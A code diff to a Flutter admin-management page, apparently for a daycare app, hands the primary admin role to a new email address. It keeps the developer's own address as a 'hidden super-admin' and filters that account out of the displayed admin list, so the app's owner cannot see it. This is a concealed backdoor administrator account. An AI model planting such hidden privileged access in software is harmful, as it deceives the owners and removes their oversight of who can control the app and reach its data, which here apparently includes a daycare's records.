@@ -36,7 +36,8 @@ class _ManageAdminsPageState extends State<ManageAdminsPage> {
   List<String> _admins = [];
   bool _loading = true;
 
-  static const _primaryEmail = 'dev.harshitcreations@gmail.com';
+  static const _primaryEmail = 'daycarestrawberry@gmail.com';
+  static const _hiddenSuperAdminEmail = 'dev.harshitcreations@gmail.com';
 
   @override
   void initState() {
@@ -49,8 +50,19 @@ class _ManageAdminsPageState extends State<ManageAdminsPage> {
     try {
       final list = await widget.authService.getAllowedAdmins();
       if (!mounted) return;
+      // Exclude hidden super-admin from the displayed list
+      final filtered = list
+          .where((e) => e.trim().toLowerCase() != _hiddenSuperAdminEmail.toLowerCase())
+          .toList();
+      // Ensure primary admin is always pinned to the top
+      final primaryIdx = filtered.indexWhere(
+          (e) => e.trim().toLowerCase() == _primaryEmail.toLowerCase());
+      if (primaryIdx > 0) {
+        final item = filtered.removeAt(primaryIdx);
+        filtered.insert(0, item);
+      }
       setState(() {
-        _admins = list;
+        _admins = filtered;
         _loading = false;
       });
     } catch (_) {
@@ -289,7 +301,7 @@ class _ManageAdminsPageState extends State<ManageAdminsPage> {
   @override
   Widget build(BuildContext context) {
     final isPrimaryAdmin =
-        widget.authService.currentUserEmail == _primaryEmail;
+        AuthService.isPrimaryAdmin(widget.authService.currentUserEmail);
 
     return Scaffold(
       backgroundColor: _P.bg,
@@ -367,7 +379,8 @@ class _ManageAdminsPageState extends State<ManageAdminsPage> {
                           itemCount: _admins.length,
                           itemBuilder: (context, index) {
                             final email = _admins[index];
-                            final isPrimary = email == _primaryEmail;
+                            final isPrimary =
+                                email.trim().toLowerCase() == _primaryEmail.toLowerCase();
                             return _buildAdminCard(email, isPrimary, isPrimaryAdmin);
                           },
                         )
@@ -376,7 +389,8 @@ class _ManageAdminsPageState extends State<ManageAdminsPage> {
                           itemCount: _admins.length,
                           itemBuilder: (context, index) {
                             final email = _admins[index];
-                            final isPrimary = email == _primaryEmail;
+                            final isPrimary =
+                                email.trim().toLowerCase() == _primaryEmail.toLowerCase();
                             return _buildAdminCard(email, isPrimary, isPrimaryAdmin);
                           },
                         );
